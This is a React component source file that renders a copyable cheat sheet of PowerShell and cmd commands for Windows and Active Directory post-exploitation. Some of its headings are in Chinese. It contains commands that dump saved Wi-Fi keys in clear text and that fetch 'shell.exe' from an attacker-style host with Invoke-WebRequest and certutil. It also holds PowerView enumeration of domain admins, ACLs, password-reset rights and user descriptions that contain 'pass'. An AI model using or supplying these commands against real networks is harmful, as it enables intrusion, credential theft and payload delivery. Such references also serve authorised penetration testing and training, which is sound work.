import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph, Text } = Typography;

export default (props) => {
	const local_sys_enum = [
		{ title: 'systeminfo' },
		{ title: 'Get-WmiObject Win32_ComputerSystem' },
		{ title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' }
	];
	const lastpatchlist = 'Get-Hotfix -description "Security update"';
	const lastpatchlist_wmic = 'wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn"';
	const envVar = 'Get-ChildItem Env: | ft Key,Value';
	const envVar_cmd = 'set';
	const wlan_creddump = [
		{ title: 'netsh wlan show profiles' },
		{ title: 'netsh wlan show profile name="PROFILE-NAME" key=clear' }
	];

	// windows wget like
	const powershell_http_dl = ' Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';

	// domain enum
	const domain_name = `Get-NetDomain`;
	const forest_domain_list = `Get-NetForestDomain`;
	const domain_SID = `Get-DomainSID `;
	const domain_Policy = `Get-DomainPolicy`;
	const domain_OUs = `Get-NetOU`;
	const domain_trust = `Get-NetDomainTrust`;
	// gpo
	const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
	// passwd enum
	const passwd_lastset = `Get-UserProperty –Properties pwdlastset`;
	const user_desc_harvest = `Find-UserField -SearchField Description –SearchTerm “pass”`;

	//computers domain
	const domain_computers = `Get-NetComputer`;
	const domain_pingable_computers = `Get-NetComputer -Ping`;
	const domain_win7U_computers = `Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`;

	//domain admins
	const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
	const domain_admins_groups = `Get-NetGroup *admin*`;
	const local_admins = `Get-NetLocalGroup –ComputerName PCNAME-001`;
	const user_group_membership = `Get-NetGroup –UserName "username"`;

	//acl
	const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
	const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
	const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;

	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				Powershell handy commands
			</Title>
			<Paragraph style={{ margin: 15 }}>List of useful Powershell commands</Paragraph>
			<Divider dashed />
			<div
				key='a'
				style={{
					padding: 15
				}}
			>
				<Title level={3}>系统枚举</Title>
				{local_sys_enum.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
				<Text strong># 安全补丁列表</Text>
				<Paragraph copyable ellipsis={true}>
					{lastpatchlist}
				</Paragraph>
				<Paragraph copyable ellipsis={true}>
					{lastpatchlist_wmic}
				</Paragraph>
				<Text strong># Environment Variables</Text>
				<Paragraph copyable ellipsis={true}>
					{envVar}
				</Paragraph>
				<Text strong> (over cmd.exe) </Text>
				<Paragraph copyable ellipsis={true}>
					{envVar_cmd}
				</Paragraph>
				<Divider dashed />
				<Title level={4}>HTTP download (wget like)</Title>
				<Paragraph copyable ellipsis={true}>
					{powershell_http_dl}
				</Paragraph>
				<Text strong># cmd compatible</Text>
				<Paragraph copyable ellipsis={true}>
					{cmd_cert_http_dl}
				</Paragraph>
				<Divider dashed />
				<Title level={4}>WLAN enumeration</Title>
				{wlan_creddump.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>

			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15
				}}
			>
				<Title level={2}>Active Directory枚举</Title>

				<Title level={4}> 域枚举</Title>

				<Paragraph copyable ellipsis={true}>
					{domain_name}
				</Paragraph>

				<Text strong># 森林域列表</Text>
				<Paragraph copyable ellipsis={true}>
					{forest_domain_list}
				</Paragraph>

				<Text strong># 域SID </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_SID}
				</Paragraph>

				<Text strong>#域策略 </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_Policy}
				</Paragraph>

				<Text strong>#域组织单位 </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_OUs}
				</Paragraph>

				<Text strong># 可信域列表</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_trust}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> GPO枚举</Title>

				<Text strong># Gpo应用于机器</Text>
				<Paragraph copyable ellipsis={true}>
					{gpo_enum}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> 密码枚举</Title>

				<Text strong># Last Password Set date</Text>
				<Paragraph copyable ellipsis={true}>
					{passwd_lastset}
				</Paragraph>
				<Text strong># Description of User object </Text>
				<Paragraph copyable ellipsis={true}>
					{user_desc_harvest}
				</Paragraph>
				<Divider dashed />

				<Title level={4}> 电脑枚举</Title>

				<Text strong># 列出域内的计算机</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_computers}
				</Paragraph>
				<Text strong># Pingable主机列表 </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_pingable_computers}
				</Paragraph>
				<Text strong># 列出Windows 7终极计算机 </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_win7U_computers}
				</Paragraph>

				<Divider dashed />

				<Title level={4}> 管理组和帐户枚举</Title>

				<Text strong># 列出域管理员成员</Text>
				<Paragraph copyable ellipsis={true}>
					{domain_admin_members}
				</Paragraph>
				<Text strong># 列出域管理组 </Text>
				<Paragraph copyable ellipsis={true}>
					{domain_admins_groups}
				</Paragraph>
				<Text strong># 列出本地管理员[需要管理权限]</Text>
				<Paragraph copyable ellipsis={true}>
					{local_admins}
				</Paragraph>

				<Text strong># 获取用户组[需要管理权限] </Text>
				<Paragraph copyable ellipsis={true}>
					{user_group_membership}
				</Paragraph>

				<Divider dashed />

				<Title level={4}>ACL枚举</Title>

				<Text strong># 用户的ACL </Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_user_enum}
				</Paragraph>

				<Text strong># GPO修改的权利</Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_gpoedit_rights}
				</Paragraph>

				<Text strong># 密码重置</Text>
				<Paragraph copyable ellipsis={true}>
					{ACL_passwd_edit_rights}
				</Paragraph>
			</div>
		</QueueAnim>
	);
};
